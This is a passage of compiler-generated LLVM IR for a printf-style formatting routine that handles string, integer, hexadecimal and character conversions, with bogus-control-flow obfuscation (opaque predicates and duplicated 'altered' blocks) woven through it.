  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %93
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp sle i32 %104, 57
  %106 = load i32, i32* @x.7
  %107 = load i32, i32* @y.8
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %114

; <label>:114:                                    ; preds = %originalBBpart28, %88
  %115 = phi i1 [ false, %88 ], [ %105, %originalBBpart28 ]
  br i1 %115, label %116, label %144

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* %7, align 4
  %118 = mul nsw i32 %117, 10
  store i32 %118, i32* %7, align 4
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = sub nsw i32 %121, 48
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, %122
  store i32 %124, i32* %7, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  %126 = load i32, i32* @x.7
  %127 = load i32, i32* @y.8
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %125
  %134 = load i8*, i8** %5, align 8
  %135 = getelementptr inbounds i8, i8* %134, i32 1
  store i8* %135, i8** %5, align 8
  %136 = load i32, i32* @x.7
  %137 = load i32, i32* @y.8
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %88

; <label>:144:                                    ; preds = %114
  %145 = load i8*, i8** %5, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 115
  br i1 %148, label %149, label %215

; <label>:149:                                    ; preds = %144
  %150 = load i32, i32* @x.7
  %151 = load i32, i32* @y.8
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %149
  %158 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %159 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 0
  %160 = load i32, i32* %159, align 8
  %161 = icmp ule i32 %160, 40
  %162 = load i32, i32* @x.7
  %163 = load i32, i32* @y.8
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %161, label %170, label %176

; <label>:170:                                    ; preds = %originalBBpart216
  %171 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 3
  %172 = load i8*, i8** %171, align 8
  %173 = getelementptr i8, i8* %172, i32 %160
  %174 = bitcast i8* %173 to i32*
  %175 = add i32 %160, 8
  store i32 %175, i32* %159, align 8
  br label %181

; <label>:176:                                    ; preds = %originalBBpart216
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %158, i32 0, i32 2
  %178 = load i8*, i8** %177, align 8
  %179 = bitcast i8* %178 to i32*
  %180 = getelementptr i8, i8* %178, i32 8
  store i8* %180, i8** %177, align 8
  br label %181

; <label>:181:                                    ; preds = %176, %170
  %182 = phi i32* [ %174, %170 ], [ %179, %176 ]
  %183 = load i32, i32* %182, align 4
  %184 = sext i32 %183 to i64
  %185 = inttoptr i64 %184 to i8*
  store i8* %185, i8** %11, align 8
  %186 = load i8**, i8*** %4, align 8
  %187 = load i8*, i8** %11, align 8
  %188 = icmp ne i8* %187, null
  br i1 %188, label %189, label %207

; <label>:189:                                    ; preds = %181
  %190 = load i32, i32* @x.7
  %191 = load i32, i32* @y.8
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %189
  %198 = load i8*, i8** %11, align 8
  %199 = load i32, i32* @x.7
  %200 = load i32, i32* @y.8
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %208

; <label>:207:                                    ; preds = %181
  br label %208

; <label>:208:                                    ; preds = %207, %originalBBpart220
  %209 = phi i8* [ %198, %originalBBpart220 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.558, i32 0, i32 0), %207 ]
  %210 = load i32, i32* %7, align 4
  %211 = load i32, i32* %8, align 4
  %212 = call i32 @prints(i8** %186, i8* %209, i32 %210, i32 %211)
  %213 = load i32, i32* %9, align 4
  %214 = add nsw i32 %213, %212
  store i32 %214, i32* %9, align 4
  br label %603

; <label>:215:                                    ; preds = %144
  %216 = load i8*, i8** %5, align 8
  %217 = load i8, i8* %216, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 100
  br i1 %219, label %220, label %293

; <label>:220:                                    ; preds = %215
  %221 = load i32, i32* @x.7
  %222 = load i32, i32* @y.8
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %220
  %229 = load i8**, i8*** %4, align 8
  %230 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %231 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = icmp ule i32 %232, 40
  %234 = load i32, i32* @x.7
  %235 = load i32, i32* @y.8
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %233, label %242, label %248

; <label>:242:                                    ; preds = %originalBBpart224
  %243 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 3
  %244 = load i8*, i8** %243, align 8
  %245 = getelementptr i8, i8* %244, i32 %232
  %246 = bitcast i8* %245 to i32*
  %247 = add i32 %232, 8
  store i32 %247, i32* %231, align 8
  br label %269

; <label>:248:                                    ; preds = %originalBBpart224
  %249 = load i32, i32* @x.7
  %250 = load i32, i32* @y.8
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %248
  %257 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 2
  %258 = load i8*, i8** %257, align 8
  %259 = bitcast i8* %258 to i32*
  %260 = getelementptr i8, i8* %258, i32 8
  store i8* %260, i8** %257, align 8
  %261 = load i32, i32* @x.7
  %262 = load i32, i32* @y.8
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %269

; <label>:269:                                    ; preds = %originalBBpart228, %242
  %270 = phi i32* [ %246, %242 ], [ %259, %originalBBpart228 ]
  %271 = load i32, i32* @x.7
  %272 = load i32, i32* @y.8
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %269
  %279 = load i32, i32* %270, align 4
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @printi(i8** %229, i32 %279, i32 10, i32 1, i32 %280, i32 %281, i32 97)
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, %282
  store i32 %284, i32* %9, align 4
  %285 = load i32, i32* @x.7
  %286 = load i32, i32* @y.8
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBBpart237, label %originalBB30alteredBB

originalBBpart237:                                ; preds = %originalBB30
  br label %603

; <label>:293:                                    ; preds = %215
  %294 = load i8*, i8** %5, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 120
  br i1 %297, label %298, label %355

; <label>:298:                                    ; preds = %293
  %299 = load i8**, i8*** %4, align 8
  %300 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %301 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 8
  %303 = icmp ule i32 %302, 40
  br i1 %303, label %304, label %310

; <label>:304:                                    ; preds = %298
  %305 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 3
  %306 = load i8*, i8** %305, align 8
  %307 = getelementptr i8, i8* %306, i32 %302
  %308 = bitcast i8* %307 to i32*
  %309 = add i32 %302, 8
  store i32 %309, i32* %301, align 8
  br label %331

; <label>:310:                                    ; preds = %298
  %311 = load i32, i32* @x.7
  %312 = load i32, i32* @y.8
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %310
  %319 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 2
  %320 = load i8*, i8** %319, align 8
  %321 = bitcast i8* %320 to i32*
  %322 = getelementptr i8, i8* %320, i32 8
  store i8* %322, i8** %319, align 8
  %323 = load i32, i32* @x.7
  %324 = load i32, i32* @y.8
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %331

; <label>:331:                                    ; preds = %originalBBpart241, %304
  %332 = phi i32* [ %308, %304 ], [ %321, %originalBBpart241 ]
  %333 = load i32, i32* @x.7
  %334 = load i32, i32* @y.8
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %331
  %341 = load i32, i32* %332, align 4
  %342 = load i32, i32* %7, align 4
  %343 = load i32, i32* %8, align 4
  %344 = call i32 @printi(i8** %299, i32 %341, i32 16, i32 0, i32 %342, i32 %343, i32 97)
  %345 = load i32, i32* %9, align 4
  %346 = add nsw i32 %345, %344
  store i32 %346, i32* %9, align 4
  %347 = load i32, i32* @x.7
  %348 = load i32, i32* @y.8
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart254, label %originalBB43alteredBB

originalBBpart254:                                ; preds = %originalBB43
  br label %603

; <label>:355:                                    ; preds = %293
  %356 = load i32, i32* @x.7
  %357 = load i32, i32* @y.8
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %355
  %364 = load i8*, i8** %5, align 8
  %365 = load i8, i8* %364, align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 88
  %368 = load i32, i32* @x.7
  %369 = load i32, i32* @y.8
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %367, label %376, label %449

; <label>:376:                                    ; preds = %originalBBpart258
  %377 = load i32, i32* @x.7
  %378 = load i32, i32* @y.8
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %376
  %385 = load i8**, i8*** %4, align 8
  %386 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %387 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 0
  %388 = load i32, i32* %387, align 8
  %389 = icmp ule i32 %388, 40
  %390 = load i32, i32* @x.7
  %391 = load i32, i32* @y.8
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %389, label %398, label %420

; <label>:398:                                    ; preds = %originalBBpart262
  %399 = load i32, i32* @x.7
  %400 = load i32, i32* @y.8
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %398
  %407 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 3
  %408 = load i8*, i8** %407, align 8
  %409 = getelementptr i8, i8* %408, i32 %388
  %410 = bitcast i8* %409 to i32*
  %411 = add i32 %388, 8
  store i32 %411, i32* %387, align 8
  %412 = load i32, i32* @x.7
  %413 = load i32, i32* @y.8
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart269, label %originalBB64alteredBB

originalBBpart269:                                ; preds = %originalBB64
  br label %441

; <label>:420:                                    ; preds = %originalBBpart262
  %421 = load i32, i32* @x.7
  %422 = load i32, i32* @y.8
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %420
  %429 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %386, i32 0, i32 2
  %430 = load i8*, i8** %429, align 8
  %431 = bitcast i8* %430 to i32*
  %432 = getelementptr i8, i8* %430, i32 8
  store i8* %432, i8** %429, align 8
  %433 = load i32, i32* @x.7
  %434 = load i32, i32* @y.8
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %441

; <label>:441:                                    ; preds = %originalBBpart273, %originalBBpart269
  %442 = phi i32* [ %410, %originalBBpart269 ], [ %431, %originalBBpart273 ]
  %443 = load i32, i32* %442, align 4
  %444 = load i32, i32* %7, align 4
  %445 = load i32, i32* %8, align 4
  %446 = call i32 @printi(i8** %385, i32 %443, i32 16, i32 0, i32 %444, i32 %445, i32 65)
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, %446
  store i32 %448, i32* %9, align 4
  br label %603

; <label>:449:                                    ; preds = %originalBBpart258
  %450 = load i32, i32* @x.7
  %451 = load i32, i32* @y.8
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %449
  %458 = load i8*, i8** %5, align 8
  %459 = load i8, i8* %458, align 1
  %460 = zext i8 %459 to i32
  %461 = icmp eq i32 %460, 117
  %462 = load i32, i32* @x.7
  %463 = load i32, i32* @y.8
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %461, label %470, label %527

; <label>:470:                                    ; preds = %originalBBpart277
  %471 = load i8**, i8*** %4, align 8
  %472 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %473 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %472, i32 0, i32 0
  %474 = load i32, i32* %473, align 8
  %475 = icmp ule i32 %474, 40
  br i1 %475, label %476, label %498

; <label>:476:                                    ; preds = %470
  %477 = load i32, i32* @x.7
  %478 = load i32, i32* @y.8
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %476
  %485 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %472, i32 0, i32 3
  %486 = load i8*, i8** %485, align 8
  %487 = getelementptr i8, i8* %486, i32 %474
  %488 = bitcast i8* %487 to i32*
  %489 = add i32 %474, 8
  store i32 %489, i32* %473, align 8
  %490 = load i32, i32* @x.7
  %491 = load i32, i32* @y.8
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart284, label %originalBB79alteredBB

originalBBpart284:                                ; preds = %originalBB79
  br label %503

; <label>:498:                                    ; preds = %470
  %499 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %472, i32 0, i32 2
  %500 = load i8*, i8** %499, align 8
  %501 = bitcast i8* %500 to i32*
  %502 = getelementptr i8, i8* %500, i32 8
  store i8* %502, i8** %499, align 8
  br label %503

; <label>:503:                                    ; preds = %498, %originalBBpart284
  %504 = phi i32* [ %488, %originalBBpart284 ], [ %501, %498 ]
  %505 = load i32, i32* @x.7
  %506 = load i32, i32* @y.8
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %503
  %513 = load i32, i32* %504, align 4
  %514 = load i32, i32* %7, align 4
  %515 = load i32, i32* %8, align 4
  %516 = call i32 @printi(i8** %471, i32 %513, i32 10, i32 0, i32 %514, i32 %515, i32 97)
  %517 = load i32, i32* %9, align 4
  %518 = add nsw i32 %517, %516
  store i32 %518, i32* %9, align 4
  %519 = load i32, i32* @x.7
  %520 = load i32, i32* @y.8
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart290, label %originalBB86alteredBB

originalBBpart290:                                ; preds = %originalBB86
  br label %603

; <label>:527:                                    ; preds = %originalBBpart277
  %528 = load i32, i32* @x.7
  %529 = load i32, i32* @y.8
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %527
  %536 = load i8*, i8** %5, align 8
  %537 = load i8, i8* %536, align 1
  %538 = zext i8 %537 to i32
  %539 = icmp eq i32 %538, 99
  %540 = load i32, i32* @x.7
  %541 = load i32, i32* @y.8
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %539, label %548, label %577

; <label>:548:                                    ; preds = %originalBBpart294
  %549 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %550 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %549, i32 0, i32 0
  %551 = load i32, i32* %550, align 8
  %552 = icmp ule i32 %551, 40
  br i1 %552, label %553, label %559

; <label>:553:                                    ; preds = %548
  %554 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %549, i32 0, i32 3
  %555 = load i8*, i8** %554, align 8
  %556 = getelementptr i8, i8* %555, i32 %551
  %557 = bitcast i8* %556 to i32*
  %558 = add i32 %551, 8
  store i32 %558, i32* %550, align 8
  br label %564

; <label>:559:                                    ; preds = %548
  %560 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %549, i32 0, i32 2
  %561 = load i8*, i8** %560, align 8
  %562 = bitcast i8* %561 to i32*
  %563 = getelementptr i8, i8* %561, i32 8
  store i8* %563, i8** %560, align 8
  br label %564

; <label>:564:                                    ; preds = %559, %553
  %565 = phi i32* [ %557, %553 ], [ %562, %559 ]
  %566 = load i32, i32* %565, align 4
  %567 = trunc i32 %566 to i8
  %568 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %567, i8* %568, align 1
  %569 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %569, align 1
  %570 = load i8**, i8*** %4, align 8
  %571 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %572 = load i32, i32* %7, align 4
  %573 = load i32, i32* %8, align 4
  %574 = call i32 @prints(i8** %570, i8* %571, i32 %572, i32 %573)
  %575 = load i32, i32* %9, align 4
  %576 = add nsw i32 %575, %574
  store i32 %576, i32* %9, align 4
  br label %603

; <label>:577:                                    ; preds = %originalBBpart294
  br label %602

; <label>:578:                                    ; preds = %17
  %579 = load i32, i32* @x.7
  %580 = load i32, i32* @y.8
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %578
  %587 = load i32, i32* @x.7
  %588 = load i32, i32* @y.8
  %589 = sub i32 %587, 1
  %590 = mul i32 %587, %589
  %591 = urem i32 %590, 2
  %592 = icmp eq i32 %591, 0
  %593 = icmp slt i32 %588, 10
  %594 = or i1 %592, %593
  br i1 %594, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %595

; <label>:595:                                    ; preds = %originalBBpart298, %51
  %596 = load i8**, i8*** %4, align 8
  %597 = load i8*, i8** %5, align 8
  %598 = load i8, i8* %597, align 1
  %599 = zext i8 %598 to i32
  call void @printchar(i8** %596, i32 %599)
  %600 = load i32, i32* %9, align 4
  %601 = add nsw i32 %600, 1
  store i32 %601, i32* %9, align 4
  br label %602

; <label>:602:                                    ; preds = %595, %577
  br label %603

; <label>:603:                                    ; preds = %602, %564, %originalBBpart290, %441, %originalBBpart254, %originalBBpart237, %208
  %604 = load i8*, i8** %5, align 8
  %605 = getelementptr inbounds i8, i8* %604, i32 1
  store i8* %605, i8** %5, align 8
  br label %12

; <label>:606:                                    ; preds = %originalBBpart2, %12
  %607 = load i8**, i8*** %4, align 8
  %608 = icmp ne i8** %607, null
  br i1 %608, label %609, label %628

; <label>:609:                                    ; preds = %606
  %610 = load i32, i32* @x.7
  %611 = load i32, i32* @y.8
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %609
  %618 = load i8**, i8*** %4, align 8
  %619 = load i8*, i8** %618, align 8
  store i8 0, i8* %619, align 1
  %620 = load i32, i32* @x.7
  %621 = load i32, i32* @y.8
  %622 = sub i32 %620, 1
  %623 = mul i32 %620, %622
  %624 = urem i32 %623, 2
  %625 = icmp eq i32 %624, 0
  %626 = icmp slt i32 %621, 10
  %627 = or i1 %625, %626
  br i1 %627, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %628

; <label>:628:                                    ; preds = %originalBBpart2102, %606
  %629 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %630 = bitcast %struct.__va_list_tag* %629 to i8*
  call void @llvm.va_end(i8* %630)
  %631 = load i32, i32* %9, align 4
  ret i32 %631

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %632 = load i8*, i8** %5, align 8
  %633 = load i8, i8* %632, align 1
  %634 = zext i8 %633 to i32
  %635 = icmp eq i32 %634, 48
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %93
  %636 = load i8*, i8** %5, align 8
  %637 = load i8, i8* %636, align 1
  %638 = zext i8 %637 to i32
  %639 = icmp sle i32 %638, 57
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %125
  %640 = load i8*, i8** %5, align 8
  %641 = getelementptr inbounds i8, i8* %640, i32 1
  store i8* %641, i8** %5, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %149
  %642 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %643 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 8
  %645 = icmp ule i32 %644, 40
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %189
  %646 = load i8*, i8** %11, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %220
  %647 = load i8**, i8*** %4, align 8
  %648 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %649 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %648, i32 0, i32 0
  %650 = load i32, i32* %649, align 8
  %651 = icmp ule i32 %650, 40
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %248
  %652 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %230, i32 0, i32 2
  %653 = load i8*, i8** %652, align 8
  %654 = bitcast i8* %653 to i32*
  %655 = getelementptr i8, i8* %653, i32 8
  store i8* %655, i8** %652, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %269
  %656 = load i32, i32* %270, align 4
  %657 = load i32, i32* %7, align 4
  %658 = load i32, i32* %8, align 4
